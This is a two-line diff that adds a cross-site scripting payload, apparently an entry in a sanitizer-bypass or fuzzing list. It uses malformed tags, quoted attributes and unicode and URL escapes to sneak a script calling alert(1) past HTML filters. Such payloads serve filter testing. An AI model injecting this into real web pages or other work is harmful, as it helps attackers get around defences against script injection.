@@ -1,0 +1,2 @@
+select><noembed></delect><script x='a@b'a>
+y='a@b'//a@b%0a\u0061lert(1)</script x>
